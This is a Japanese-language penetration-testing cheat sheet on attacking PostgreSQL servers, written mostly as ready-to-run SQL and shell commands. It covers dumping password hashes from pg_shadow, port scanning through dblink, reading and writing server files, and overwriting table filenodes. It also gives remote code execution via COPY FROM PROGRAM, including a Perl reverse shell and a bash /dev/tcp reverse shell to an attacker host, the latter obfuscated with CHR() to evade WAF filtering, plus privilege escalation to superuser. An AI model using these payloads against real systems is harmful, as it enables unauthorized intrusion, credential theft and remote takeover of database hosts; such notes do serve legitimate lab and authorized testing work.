- 関連ノート：    
    - [80 or 443 - HTTP or HTTPS](80%20or%20443%20-%20HTTP%20or%20HTTPS.md#SQLi)

- 🔗 参考リンク：
	- [PostgreSQL SQL Injection Cheat Sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet) 
	- [PostgreSQL - HackTricks](https://www.google.com/search?q=https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

---

- `pg_hba.conf`には認証情報や接続許可リストが載ってる

# 接続方法

パスワードなし認証は`-w`オプションを付与
```zsh
# ローカル接続
psql -h localhost -d <database> -U <User>

# リモート接続(デフォルトユーザ名、DB名として、postgresqlがあるので試行する)
psql -h <host> -U <username> -d <database>

# パスワード指定のリモート接続
psql -h <host> -p <port> -U <username> -W <password> -d <database>
```

---

# 🔍 Enumeration

## 基本的な列挙

DB・テーブル情報の確認
```sql
-- データベース一覧 (postgres, template0, template1はデフォ)
\list
SELECT datname FROM pg_database;

-- データベースの選択
\c <database>

-- テーブル一覧
\d

-- ユーザーロールの確認
\du+

-- 現在のユーザー
SELECT user;

-- 現在のデータベース
SELECT current_catalog;

-- スキーマ一覧
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

-- 認証情報の取得（ユーザー名とパスワードハッシュ）
SELECT usename, passwd from pg_shadow;

-- 利用可能な言語
SELECT lanname,lanacl FROM pg_language;

-- インストール済み拡張機能
SHOW rds.extensions;
SELECT * FROM pg_extension;

-- 実行履歴の確認
\s
```

## ネットワークスキャン（dblinkの悪用）

同一NWの他ホストをスキャンし、dblink接続失敗時のエラーメッセージからポートの状態を判別できる
```sql
SELECT * FROM dblink_connect('host=<target_IP>
                              port=<target_port>
                              user=<username>
                              password=<password>
                              dbname=<database>
                              connect_timeout=10');
```
- ホストがダウン：No route to host
- ポートがclosed：Connection refused
- ポートがopen：server closed the connection unexpectedly または password authentication failed
- ポートがopen もしくは filtered：Connection timed out

## 権限とロールの列挙

| 属性名            | 説明              |
| -------------- | --------------- |
| **rolsuper**   | スーパーユーザー権限      |
| rolinherit     | 権限の継承設定         |
| rolcreaterole  | ロール作成権限         |
| rolcreatedb    | データベース作成権限      |
| rolcanlogin    | ログイン可能権限        |
| rolreplication | レプリケーション権限      |
| rolconnlimit   | 同時接続制限（-1は無制限）  |
| rolpassword    | パスワード（表示は`***`） |
| rolvaliduntil  | パスワード有効期限       |
| rolbypassrls   | 行レベルセキュリティのバイパス |

興味深い特権グループ

| グループ名                     | 説明           |
| ------------------------- | ------------ |
| pg_execute_server_program | プログラムの実行が可能  |
| pg_read_server_files      | ファイルの読み取りが可能 |
| pg_write_server_files     | ファイルの書き込みが可能 |

ユーザーロールと所属グループの確認
```sql
SELECT r.rolname, r.rolsuper, r.rolinherit, r.rolcreaterole, r.rolcreatedb, r.rolcanlogin, r.rolbypassrls, r.rolconnlimit, r.rolvaliduntil, r.oid,
ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof,
r.rolreplication FROM pg_catalog.pg_roles r ORDER BY 1;
```

スーパーユーザー判定
```sql
-- on なら真、off なら偽
SELECT current_setting('is_superuser');
```

## テーブルと関数の列挙

テーブル所有者の確認
```sql
-- 全テーブル
SELECT schemaname,tablename,tableowner FROM pg_tables;

-- 特定ユーザーが所有するテーブル
SELECT schemaname,tablename,tableowner FROM pg_tables WHERE tableowner = '<username>';
```

テーブル権限の確認
```sql
-- 自身の権限一覧
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

-- 特定テーブル(例: pg_shadow)への権限
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='<table>';
```

関数（Functions）の調査
```sql
-- pg_catalog 内の関数を確認
\df *                 -- 全取得
\df *pg_ls*           -- 部分一致
\df+ pg_read_binary_file -- アクセス権確認

-- 特定スキーマの全関数
\df pg_catalog.*
-- または
SELECT routines.routine_name, parameters.data_type FROM information_schema.routines LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name WHERE routines.specific_schema='pg_catalog';
```

---

# 💥 Exploit

## ファイルシステム操作

スーパーユーザーまたは pg_read_server_files グループのメンバーが実行可能。

ファイルの読み取り
```sql
CREATE TABLE demo(t text);
COPY demo FROM '<file_path>';
SELECT * FROM demo;
```

管理者用関数による操作
```sql
\c postgres
--ディレクトリの中身表示
SELECT * FROM pg_ls_dir('<directory_path>');

-- テキストファイルの中身表示
SELECT * FROM pg_read_file('<file_path>', 0, 1000000);

-- バイナリとしてファイルを読み取り
SELECT * FROM pg_read_binary_file('<file_path>');

-- データディレクトリの確認
SHOW data_directory;
```

ファイルの書き込み
```sql
-- COPYコマンドによる書き込み（改行を含まないワンライナーである必要あり）
COPY (SELECT convert_from(decode('<BASE64_PAYLOAD>','base64'),'utf-8')) TO '<output_path>';
```

## ローカルファイル書き込みによるテーブルデータ更新

ファイル書き込み権限がある場合、データディレクトリ内のファイルノードを直接上書きして権限奪取が可能。

1. データディレクトリ取得
```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

2. ターゲットテーブルの相対パス取得
```sql
SELECT pg_relation_filepath('<table>')
```

3. ラージオブジェクト経由で編集済みファイルノードを配置
```sql
SELECT lo_from_bytea(<oid>,decode('<BASE64_EDITED_FILENODE>','base64'))
```

4. 元のファイルを上書き
```sql
SELECT lo_export(<oid>,'<full_path>')
```

## RCE

### COPY ... FROM PROGRAM による実行

9.3以降、スーパーユーザーまたは pg_execute_server_program メンバーが利用可能。

```sql
-- 基本的なコマンド実行
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '<command>';
SELECT * FROM cmd_exec;

-- リバースシェル（シングルクォートは2つ重ねてエスケープ）
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

>[!TIP]
>WAF/フィルタリング回避：CHR関数を利用してSQL文字列を動的構築することで、フィルタリングを回避できる。
```sql
DO $$DECLARE cmd text;BEGIN
  cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"''';
  EXECUTE cmd;END $$;
```

## Privilege Escalation

>[!NOTE]
PostgreSQL は権限を制限しているため、これでrootになれるわけではない。PostgreSQL 内で最高の権限はスーパーユーザー。

CREATEROLE 権限による昇格
```sql
-- 自身を特権グループに所属させる
GRANT pg_execute_server_program TO <username>;
GRANT pg_read_server_files TO <username>;
GRANT pg_write_server_files TO <username>;

-- スーパーユーザーであれば他の非スーパーユーザーのパスワード変更が可能
ALTER USER <username> WITH <password> '<new_password>';
```

SUPERUSER への昇格（ローカル信頼設定の悪用）
```sql
-- ローカル接続が trust 設定されている場合、psql経由で自身を昇格
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```

---

## Misc

- dblink を使用したローカルログインが可能で、外部IPからのログインが制限されていても、127.0.0.1 経由で dblink を叩くことでログイン可能な場合がある
```sql
SELECT * FROM dblink('host=127.0.0.1 user=<username> password=<password> dbname=<database>', 'SELECT usename,passwd from pg_shadow') RETURNS (result TEXT);
```
